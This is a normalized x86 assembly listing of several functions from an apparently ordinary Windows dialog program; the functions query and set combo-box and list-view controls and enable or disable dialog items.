jl r-xdata
sub eax 0x27
sub eax 0x61
jmp r-xdata
mov ecx [ esi + 0xf0 ]
push 0x0
push eax
push 0x14e
push ecx
call edi
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
cmp eax 0x61
jl r-xdata
sub eax 0x27
sub eax 0x61
jmp r-xdata
mov edx [ esi + 0x78 ]
push 0x0
push eax
push 0x14e
push edx
call edi
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
cmp eax 0x61
jl r-xdata
push 0x0
push 0x40e
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x40d
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x1
push 0x40e
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x40d
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
jmp r-xdata
push 0x0
push eax
mov eax [ esi + 0x12c ]
push 0x14e
push eax
call edi
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov [ esi + 0x178 ] eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov [ esi + 0x170 ] eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov [ esi + 0x17c ] eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov [ esi + 0x16c ] eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov [ esi + 0x174 ] eax
mov eax [ esi + 0x178 ]
test eax eax
pop edi
je r-xdata
push 0x0
push 0x40f
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x3f7
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x1
push 0x40f
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x3f7
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
jmp r-xdata
push 0x402
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
mov eax [ esi + 0x170 ]
test eax eax
je r-xdata
push 0x0
push 0x410
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x3f8
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x1
push 0x410
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x3f8
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
jmp r-xdata
push 0x403
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
mov eax [ esi + 0x17c ]
test eax eax
je r-xdata
push 0x0
push 0x3ff
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x3fa
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x1
push 0x3ff
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x3fa
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
jmp r-xdata
push 0x404
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
mov eax [ esi + 0x16c ]
test eax eax
je r-xdata
push 0x0
push 0x1
jmp r-xdata
push 0x405
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
mov eax [ esi + 0x174 ]
test eax eax
je r-xdata
push 0x409
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
mov ecx esi
call sub_421060
mov eax 0x1
pop esi
retn
sub_405710
push ebx
push esi
push edi
mov esi ecx
push 0x1
call sub_421060
call sub_4272f7
mov ecx [ esi + 0x15c ]
mov eax [ eax + 0x4 ]
push ecx
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
call sub_4272f7
mov edx [ esi + 0x154 ]
mov eax [ eax + 0x4 ]
push edx
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
call sub_4272f7
mov ecx [ esi + 0x164 ]
mov eax [ eax + 0x4 ]
push ecx
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
call sub_4272f7
mov edx [ esi + 0x14c ]
mov eax [ eax + 0x4 ]
push edx
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
call sub_4272f7
mov ecx [ esi + 0x160 ]
mov eax [ eax + 0x4 ]
push ecx
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
call sub_4272f7
mov edx [ esi + 0x158 ]
mov eax [ eax + 0x4 ]
push edx
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
call sub_4272f7
mov ecx [ esi + 0x168 ]
mov eax [ eax + 0x4 ]
push ecx
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
call sub_4272f7
mov edx [ esi + 0x150 ]
mov eax [ eax + 0x4 ]
push edx
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
mov eax [ esi + 0xb4 ]
mov ebx [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x147
push eax
call ebx
mov edi eax
cmp edi 0x1a
jge r-xdata
add edi 0x27
add edi 0x61
jmp r-xdata
add edi 0x27
add edi 0x61
jmp r-xdata
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
mov ecx [ esi + 0xf0 ]
push 0x0
push 0x0
push 0x147
push ecx
call ebx
mov edi eax
cmp edi 0x1a
jge r-xdata
add edi 0x27
add edi 0x61
jmp r-xdata
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
mov edx [ esi + 0x78 ]
push 0x0
push 0x0
push 0x147
push edx
call ebx
mov edi eax
cmp edi 0x1a
jge r-xdata
add edi 0x27
add edi 0x61
jmp r-xdata
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
mov eax [ esi + 0x12c ]
push 0x0
push 0x0
push 0x147
push eax
call ebx
mov edi eax
cmp edi 0x1a
jge r-xdata
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
call sub_4272f7
mov ecx [ esi + 0x178 ]
mov eax [ eax + 0x4 ]
push ecx
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
call sub_4272f7
mov edx [ esi + 0x170 ]
mov eax [ eax + 0x4 ]
push edx
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
call sub_4272f7
mov ecx [ esi + 0x17c ]
mov eax [ eax + 0x4 ]
push ecx
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
call sub_4272f7
mov edx [ esi + 0x16c ]
mov eax [ eax + 0x4 ]
push edx
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
mov ecx esi
call sub_41edb6
pop edi
pop esi
pop ebx
retn
sub_4059a0
push 0xffffffff
push sub_42a676
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x98
push 0x0
lea ecx [ esp + 0x4 ]
call sub_404ae0
lea ecx [ esp ]
mov [ esp + 0xa0 ] 0x0
call sub_41eac9
lea ecx [ esp + 0x5c ]
mov [ esp + 0xa0 ] 0x1
call sub_41dd6c
lea ecx [ esp ]
mov [ esp + 0xa0 ] 0xffffffff
call sub_41e7a7
mov ecx [ esp + 0x98 ]
mov [ fs : 0x0 ] ecx
add esp 0xa4
retn
sub_405a20
push esi
mov esi ecx
push 0x1
call sub_421060
mov eax [ esi + 0x178 ]
test eax eax
je r-xdata
push 0x0
push 0x40e
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x40d
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x1
push 0x40e
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x40d
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
jmp r-xdata
push 0x402
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
pop esi
retn
sub_405ab0
push esi
mov esi ecx
push 0x1
call sub_421060
mov eax [ esi + 0x170 ]
test eax eax
je r-xdata
push 0x0
push 0x40f
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x3f7
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x1
push 0x40f
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x3f7
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
jmp r-xdata
push 0x403
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
pop esi
retn
sub_405b40
push esi
mov esi ecx
push 0x1
call sub_421060
mov eax [ esi + 0x17c ]
test eax eax
je r-xdata
push 0x0
push 0x410
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x3f8
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x1
push 0x410
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x3f8
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
jmp r-xdata
push 0x404
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
pop esi
retn
sub_405bd0
push esi
mov esi ecx
push 0x1
call sub_421060
mov eax [ esi + 0x16c ]
test eax eax
je r-xdata
push 0x0
push 0x3ff
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x3fa
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x1
push 0x3ff
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x3fa
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
jmp r-xdata
push 0x405
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
pop esi
retn
sub_405c60
push esi
mov esi ecx
push 0x1
call sub_421060
mov eax [ esi + 0x174 ]
test eax eax
je r-xdata
push 0x0
push 0x1
jmp r-xdata
push 0x409
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
pop esi
retn
sub_405cc0
push 0xffffffff
push sub_42a693
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push esi
push edi
mov esi ecx
push eax
push 0x9d
mov [ esp + 0x14 ] esi
call sub_41ea14
lea edi [ esi + 0x5c ]
xor ebx ebx
mov ecx edi
mov [ esp + 0x18 ] ebx
call sub_41efc6
mov [ edi ] r--data
lea edi [ esi + 0x98 ]
mov [ esp + 0x18 ] 0x1
mov ecx edi
call sub_41efc6
mov ecx [ esp + 0x10 ]
mov [ edi ] r--data
mov [ esi ] r--data
mov [ esi + 0xd4 ] ebx
mov [ esi + 0xd8 ] ebx
mov [ esi + 0xdc ] ebx
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_405d70
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x5c ]
push eax
push 0x423
push edi
call sub_425678
lea ecx [ esi + 0x98 ]
push ecx
push 0x422
push edi
call sub_425678
lea edx [ esi + 0xd4 ]
push edx
push 0x424
push edi
call sub_4255a5
lea eax [ esi + 0xd8 ]
push eax
push 0x413
push edi
call sub_4255a5
add esi 0xdc
push esi
push 0x427
push edi
call sub_425626
pop edi
pop esi
retn 0x4
sub_405df0
push 0xffffffff
push sub_42a710
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x48
push ebx
push esi
push edi
mov edi ecx
push 0x1
mov [ esp + 0x28 ] edi
call sub_421060
mov eax [ rw-data ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x5c ] 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x14 ] eax
mov ebx 0x3
mov [ esp + 0x5c ] bl
call sub_4272f7
mov ecx [ edi + 0xdc ]
mov eax [ eax + 0x4 ]
push ecx
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
mov edx [ edi + 0xb4 ]
push 0x0
push 0x0
push 0x1004
push edx
call [ SendMessageA@IAT ]
mov esi eax
mov [ esp + 0x20 ] esi
call sub_4272f7
mov eax [ eax + 0x4 ]
push esi
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
cmp [ edi + 0xdc ] 0x1
jne r-xdata
mov eax [ esp + 0x20 ]
xor esi esi
test eax eax
jle r-xdata
test esi esi
jne r-xdata
mov ecx edi
call sub_41edb6
lea ecx [ esp + 0x14 ]
mov [ esp + 0x5c ] 0x2
call sub_422478
lea ecx [ esp + 0x1c ]
mov [ esp + 0x5c ] 0x1
call sub_422478
lea ecx [ esp + 0x18 ]
mov [ esp + 0x5c ] 0x0
call sub_422478
lea ecx [ esp + 0x10 ]
mov [ esp + 0x5c ] 0xffffffff
call sub_422478
mov ecx [ esp + 0x54 ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x54
retn
lea edi [ esi + 0x1 ]
lea eax [ esp + 0x1c ]
push edi
push rw-data
push eax
call sub_41dba7
mov edx [ esp + 0x30 ]
add esp 0xc
lea ecx [ esp + 0x28 ]
push 0x0
push esi
push ecx
lea ecx [ edx + 0x98 ]
call sub_41dda4
push eax
lea ecx [ esp + 0x1c ]
mov [ esp + 0x60 ] 0x4
call sub_4225b1
lea ecx [ esp + 0x28 ]
mov [ esp + 0x5c ] bl
call sub_422478
lea eax [ esp + 0x2c ]
push 0x2
push eax
lea ecx [ esp + 0x20 ]
call sub_41d7b7
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0x60 ] 0x5
call sub_4225b1
lea ecx [ esp + 0x2c ]
mov [ esp + 0x5c ] bl
call sub_422478
mov ecx [ esp + 0x10 ]
push rw-data
push ecx
call sub_41051e
add esp 0x8
test eax eax
jne r-xdata
push esi
push rw-data
push rw-data
mov ecx edi
call sub_420904
mov [ edi + 0xdc ] esi
mov edx [ esp + 0x10 ]
push rw-data
push edx
call sub_41051e
add esp 0x8
test eax eax
jne r-xdata
push rw-data
lea ecx [ esp + 0x18 ]
call sub_422601
mov eax [ esp + 0x10 ]
push rw-data
push eax
call sub_41051e
add esp 0x8
test eax eax
jne r-xdata
push rw-data
lea ecx [ esp + 0x18 ]
call sub_422601
mov ecx [ esp + 0x10 ]
push rw-data
push ecx
call sub_41051e
add esp 0x8
test eax eax
jne r-xdata
push rw-data
lea ecx [ esp + 0x18 ]
call sub_422601
mov eax [ esp + 0x18 ]
push 0x0
push rw-data
lea ecx [ esp + 0x20 ]
mov esi [ eax - 0x8 ]
call sub_41d82f
sub esi eax
lea ecx [ esp + 0x44 ]
sub esi 0x2
push esi
push ecx
lea ecx [ esp + 0x20 ]
call sub_41d73b
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0x60 ] 0xa
call sub_4225b1
lea ecx [ esp + 0x44 ]
mov [ esp + 0x5c ] bl
call sub_422478
mov edx [ esp + 0x10 ]
lea ecx [ esp + 0x10 ]
mov eax [ edx - 0x8 ]
add eax 0xfffffffd
push eax
lea eax [ esp + 0x4c ]
push eax
call sub_41d7b7
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0x60 ] 0xb
call sub_4225b1
lea ecx [ esp + 0x48 ]
mov [ esp + 0x5c ] bl
call sub_422478
lea ecx [ esp + 0x10 ]
push ecx
lea ecx [ esp + 0x18 ]
call sub_42272d
push 0x0
push rw-data
lea ecx [ esp + 0x20 ]
call sub_41d82f
lea edx [ esp + 0x4c ]
push eax
push edx
lea ecx [ esp + 0x20 ]
call sub_41d7b7
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0x60 ] 0xc
call sub_4225b1
lea ecx [ esp + 0x4c ]
mov [ esp + 0x5c ] bl
call sub_422478
mov eax [ esp + 0x10 ]
push 0x0
push rw-data
lea ecx [ esp + 0x18 ]
mov esi [ eax - 0x8 ]
call sub_41d82f
sub esi eax
lea ecx [ esp + 0x50 ]
sub esi ebx
push esi
push ecx
lea ecx [ esp + 0x18 ]
call sub_41d73b
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0x60 ] 0xd
call sub_4225b1
lea ecx [ esp + 0x50 ]
mov [ esp + 0x5c ] bl
call sub_422478
push rw-data
lea ecx [ esp + 0x18 ]
call sub_422706
lea edx [ esp + 0x30 ]
push 0x4
push edx
lea ecx [ esp + 0x20 ]
call sub_41d7b7
mov eax [ eax ]
push rw-data
push eax
call sub_41051e
add esp 0x8
lea ecx [ esp + 0x30 ]
test eax eax
sete [ esp + 0xf ]
call sub_422478
mov al [ esp + 0xf ]
test al al
je r-xdata
mov edi [ esp + 0x24 ]
push rw-data
lea ecx [ esp + 0x18 ]
call sub_422601
mov eax [ esp + 0x18 ]
push 0x0
push rw-data
lea ecx [ esp + 0x20 ]
mov esi [ eax - 0x8 ]
call sub_41d82f
sub esi eax
lea ecx [ esp + 0x34 ]
sub esi 0x2
push esi
push ecx
lea ecx [ esp + 0x20 ]
call sub_41d73b
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0x60 ] 0x6
call sub_4225b1
lea ecx [ esp + 0x34 ]
mov [ esp + 0x5c ] bl
call sub_422478
mov edx [ esp + 0x10 ]
lea ecx [ esp + 0x10 ]
mov eax [ edx - 0x8 ]
add eax 0xfffffffd
push eax
lea eax [ esp + 0x3c ]
push eax
call sub_41d7b7
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0x60 ] 0x7
call sub_4225b1
lea ecx [ esp + 0x38 ]
mov [ esp + 0x5c ] bl
call sub_422478
lea ecx [ esp + 0x10 ]
push ecx
lea ecx [ esp + 0x18 ]
call sub_42272d
push rw-data
lea ecx [ esp + 0x18 ]
call sub_422706
push 0x0
push rw-data
lea ecx [ esp + 0x20 ]
call sub_41d82f
lea edx [ esp + 0x3c ]
push eax
push edx
lea ecx [ esp + 0x20 ]
call sub_41d7b7
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0x60 ] 0x8
call sub_4225b1
lea ecx [ esp + 0x3c ]
mov [ esp + 0x5c ] bl
call sub_422478
mov eax [ esp + 0x10 ]
push 0x0
push rw-data
lea ecx [ esp + 0x18 ]
mov esi [ eax - 0x8 ]
call sub_41d82f
sub esi eax
lea ecx [ esp + 0x40 ]
sub esi ebx
push esi
push ecx
lea ecx [ esp + 0x18 ]
call sub_41d73b
mov [ esp + 0x5c ] 0x9
push eax
lea ecx [ esp + 0x14 ]
call sub_4225b1
lea ecx [ esp + 0x40 ]
mov [ esp + 0x5c ] bl
call sub_422478
jmp r-xdata
push rw-data
lea ecx [ esp + 0x18 ]
call sub_422601
lea edx [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
push edx
call sub_42272d
call sub_4272f7
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x1c ]
mov eax [ eax + 0x4 ]
push ecx
push edx
push rw-data
mov ecx eax
call sub_425ad4
mov eax [ esp + 0x20 ]
mov esi edi
cmp esi eax
jl r-xdata
sub_4062e0
push 0xffffffff
push sub_42a78c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x9c
push ebx
push ebp
push esi
push edi
mov esi ecx
call sub_41ed51
mov eax [ rw-data ]
mov [ esp + 0x1c ] eax
xor edi edi
mov [ esp + 0x18 ] eax
mov [ esp + 0xb4 ] edi
mov [ esp + 0x14 ] eax
mov [ esp + 0x20 ] eax
mov ecx [ esi + 0xb4 ]
mov ebp [ SendMessageA@IAT ]
lea eax [ esp + 0x8c ]
mov bl 0x3
push eax
push edi
push 0x101b
push ecx
mov [ esp + 0xc4 ] bl
mov [ esp + 0x74 ] 0x1
mov [ esp + 0x7c ] edi
mov [ esp + 0x9c ] 0xf
mov [ esp + 0xa0 ] 0x2
mov [ esp + 0xb0 ] edi
mov [ esp + 0xa4 ] 0x14a
mov [ esp + 0xa8 ] rw-data
call ebp
call sub_4272f7
mov eax [ eax + 0x4 ]
push edi
push rw-data
push rw-data
mov ecx eax
call sub_426df1
xor ecx ecx
cmp eax edi
mov [ esp + 0x58 ] eax
jle r-xdata
mov eax [ esi + 0x78 ]
push 0x0
push 0x0
push 0x14e
push eax
call ebp
mov [ esi + 0xd4 ] 0x1
mov [ esi + 0xd8 ] 0x0
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
push 0x0
mov ecx esi
mov [ esi + 0xdc ] eax
call sub_421060
push 0x1
mov ecx esi
call sub_421060
mov eax [ esi + 0xdc ]
test eax eax
je r-xdata
lea eax [ ecx + 0x1 ]
lea edx [ esp + 0x20 ]
push eax
push rw-data
push edx
mov [ esp + 0x5c ] eax
call sub_41dba7
add esp 0xc
call sub_4272f7
mov ecx [ esp + 0x20 ]
mov eax [ eax + 0x4 ]
push 0x0
push ecx
lea edx [ esp + 0x44 ]
push rw-data
push edx
mov ecx eax
call sub_426e5d
push eax
lea ecx [ esp + 0x1c ]
mov [ esp + 0xb8 ] 0x4
call sub_4225b1
lea ecx [ esp + 0x3c ]
mov [ esp + 0xb4 ] bl
call sub_422478
lea eax [ esp + 0x44 ]
push 0x1
push eax
lea ecx [ esp + 0x20 ]
call sub_41d7b7
push eax
lea ecx [ esp + 0x18 ]
mov [ esp + 0xb8 ] 0x5
call sub_4225b1
lea ecx [ esp + 0x44 ]
mov [ esp + 0xb4 ] bl
call sub_422478
push 0x1
push 0x55
lea ecx [ esp + 0x3c ]
call sub_41d6f2
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x14 ]
push ecx
push edx
call sub_41051e
add esp 0x8
lea ecx [ esp + 0x34 ]
test eax eax
sete [ esp + 0x13 ]
call sub_422478
mov al [ esp + 0x13 ]
test al al
je r-xdata
push 0x0
push 0x422
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x423
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x424
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x413
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x401
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x0
push 0x1
push 0x422
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x423
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x424
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x413
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
push 0x401
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
push 0x1
jmp r-xdata
push 0x1
push 0x44
lea ecx [ esp + 0x30 ]
call sub_41d6f2
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x14 ]
push eax
push ecx
call sub_41051e
add esp 0x8
lea ecx [ esp + 0x28 ]
test eax eax
sete [ esp + 0x13 ]
call sub_422478
mov al [ esp + 0x13 ]
test al al
je r-xdata
push rw-data
lea ecx [ esp + 0x20 ]
call sub_422601
push 0x425
mov ecx esi
call sub_4219cc
mov ecx eax
call sub_421bce
lea ecx [ esp + 0x20 ]
mov [ esp + 0xb4 ] 0x2
call sub_422478
lea ecx [ esp + 0x14 ]
mov [ esp + 0xb4 ] 0x1
call sub_422478
lea ecx [ esp + 0x18 ]
mov [ esp + 0xb4 ] 0x0
call sub_422478
lea ecx [ esp + 0x1c ]
mov [ esp + 0xb4 ] 0xffffffff
call sub_422478
mov ecx [ esp + 0xac ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0xa8
retn
push 0x1
push 0x4c
lea ecx [ esp + 0x34 ]
call sub_41d6f2
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x14 ]
push edx
push eax
call sub_41051e
add esp 0x8
lea ecx [ esp + 0x2c ]
test eax eax
sete [ esp + 0x13 ]
call sub_422478
mov al [ esp + 0x13 ]
test al al
je r-xdata
push rw-data
lea ecx [ esp + 0x20 ]
call sub_422601
push 0x1
push 0x52
lea ecx [ esp + 0x38 ]
call sub_41d6f2
mov ecx [ esp + 0x30 ]
mov edx [ esp + 0x14 ]
push ecx
push edx
call sub_41051e
add esp 0x8
lea ecx [ esp + 0x30 ]
test eax eax
sete [ esp + 0x13 ]
call sub_422478
mov al [ esp + 0x13 ]
test al al
je r-xdata
push rw-data
lea ecx [ esp + 0x20 ]
call sub_422601
push 0x1
push 0x49
lea ecx [ esp + 0x40 ]
call sub_41d6f2
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x14 ]
push eax
push ecx
call sub_41051e
add esp 0x8
lea ecx [ esp + 0x38 ]
test eax eax
sete [ esp + 0x13 ]
call sub_422478
mov al [ esp + 0x13 ]
test al al
je r-xdata
push rw-data
lea ecx [ esp + 0x20 ]
call sub_422601
push 0x0
push rw-data
lea ecx [ esp + 0x20 ]
call sub_41d82f
lea ecx [ esp + 0x54 ]
push eax
push ecx
lea ecx [ esp + 0x20 ]
call sub_41d7b7
push eax
lea ecx [ esp + 0x18 ]
mov [ esp + 0xb8 ] 0x9
call sub_4225b1
lea ecx [ esp + 0x54 ]
mov [ esp + 0xb4 ] bl
call sub_422478
mov edx [ esp + 0x14 ]
lea ecx [ esp + 0x14 ]
mov eax [ edx - 0x8 ]
dec eax
push eax
lea eax [ esp + 0x44 ]
push eax
call sub_41d73b
push eax
lea ecx [ esp + 0x18 ]
mov [ esp + 0xb8 ] 0xa
call sub_4225b1
lea ecx [ esp + 0x40 ]
mov [ esp + 0xb4 ] bl
call sub_422478
mov ecx [ esp + 0x14 ]
push ecx
call sub_410877
mov edx [ esp + 0x1c ]
add esp 0x4
lea ecx [ esp + 0x18 ]
mov [ esp + 0x24 ] eax
mov edi [ edx - 0x8 ]
push 0x0
push rw-data
call sub_41d82f
sub edi eax
lea eax [ esp + 0x48 ]
dec edi
lea ecx [ esp + 0x18 ]
push edi
push eax
call sub_41d73b
push eax
lea ecx [ esp + 0x18 ]
mov [ esp + 0xb8 ] 0xb
call sub_4225b1
lea ecx [ esp + 0x48 ]
mov [ esp + 0xb4 ] bl
call sub_422478
mov ecx [ esp + 0x14 ]
push ecx
call sub_410877
mov edx [ esp + 0x28 ]
add esp 0x4
lea ecx [ esp + 0x18 ]
push edx
push eax
mov eax [ esp + 0x24 ]
push eax
push rw-data
push ecx
call sub_41dba7
mov edx [ esi + 0xb4 ]
add esp 0x14
push 0x0
push 0x0
push 0x1004
push edx
call ebp
mov [ esp + 0x68 ] eax
mov eax [ esp + 0x18 ]
mov eax [ eax - 0x8 ]
lea ecx [ esp + 0x18 ]
push eax
call sub_422745
mov edx [ esi + 0xb4 ]
lea ecx [ esp + 0x64 ]
push ecx
push 0x0
push 0x1007
mov [ esp + 0x84 ] eax
push edx
push rw-data
lea ecx [ esp + 0x20 ]
call sub_422601
push 0x0
push rw-data
lea ecx [ esp + 0x20 ]
call sub_41d82f
lea edx [ esp + 0x60 ]
push eax
push edx
lea ecx [ esp + 0x20 ]
call sub_41d7b7
push eax
lea ecx [ esp + 0x18 ]
mov [ esp + 0xb8 ] 0x6
call sub_4225b1
lea ecx [ esp + 0x60 ]
mov [ esp + 0xb4 ] bl
call sub_422478
mov eax [ esp + 0x14 ]
lea ecx [ esp + 0x4c ]
mov eax [ eax - 0x8 ]
dec eax
push eax
push ecx
lea ecx [ esp + 0x1c ]
call sub_41d73b
push eax
lea ecx [ esp + 0x18 ]
mov [ esp + 0xb8 ] 0x7
call sub_4225b1
lea ecx [ esp + 0x4c ]
mov [ esp + 0xb4 ] bl
call sub_422478
mov edx [ esp + 0x14 ]
push edx
call sub_410877
add esp 0x4
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x18 ]
lea ecx [ esp + 0x18 ]
push 0x0
push rw-data
mov edi [ eax - 0x8 ]
call sub_41d82f
sub edi eax
lea ecx [ esp + 0x5c ]
dec edi
push edi
push ecx
lea ecx [ esp + 0x20 ]
call sub_41d73b
push eax
lea ecx [ esp + 0x18 ]
mov [ esp + 0xb8 ] 0x8
call sub_4225b1
lea ecx [ esp + 0x5c ]
mov [ esp + 0xb4 ] bl
call sub_422478
mov edx [ esp + 0x14 ]
push edx
call sub_410877
mov ecx [ esp + 0x28 ]
add esp 0x4
lea edx [ esp + 0x18 ]
push ecx
push eax
push rw-data
push edx
call sub_41dba7
mov eax [ esi + 0xb4 ]
add esp 0x10
push 0x0
push 0x0
push 0x1004
push eax
call ebp
mov [ esp + 0x68 ] eax
mov ecx [ esp + 0x18 ]
mov eax [ ecx - 0x8 ]
lea ecx [ esp + 0x18 ]
push eax
call sub_422745
lea edx [ esp + 0x64 ]
mov [ esp + 0x78 ] eax
mov eax [ esi + 0xb4 ]
push edx
push 0x0
push 0x1007
push eax
jmp r-xdata
call ebp
mov ecx [ esp + 0x50 ]
mov eax [ esp + 0x58 ]
cmp ecx eax
jl r-xdata
sub_4069e0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_42a7b0
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push esi
mov esi ecx
push 0x1
call sub_421060
mov eax [ esi + 0xd8 ]
test eax eax
jne r-xdata
mov eax [ esi + 0xd4 ]
test eax eax
jne r-xdata
push 0x0
